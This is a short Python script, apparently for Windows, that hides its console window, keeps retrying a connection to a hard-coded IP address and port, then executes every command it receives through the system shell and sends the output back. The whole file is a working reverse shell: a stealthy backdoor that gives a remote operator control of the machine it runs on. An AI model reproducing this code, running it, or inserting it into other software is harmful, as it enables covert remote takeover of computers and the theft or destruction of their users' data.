import ctypes,time
whnd = ctypes.windll.kernel32.GetConsoleWindow()

if whnd != 0:
    ctypes.windll.user32.ShowWindow(whnd, 0)
    ctypes.windll.kernel32.CloseHandle(whnd)

import socket as sk
import os,sys

def null():
    a = None

s = sk.socket(sk.AF_INET,sk.SOCK_STREAM)
ip = '192.168.0.109'
while True:
    try:
        s.connect((ip,12345))
    except:
        null()
    else:
        break

while True:
    try:
        info = s.recv(1024).decode()
        vel = str(os.popen(info).read())+'\n'
        print(vel)
        s.send(str(len(vel.encode())).encode())
        s.send(vel.encode())
    except Exception as r:
        s.send('ERROR\n'.encode())
        print(r)
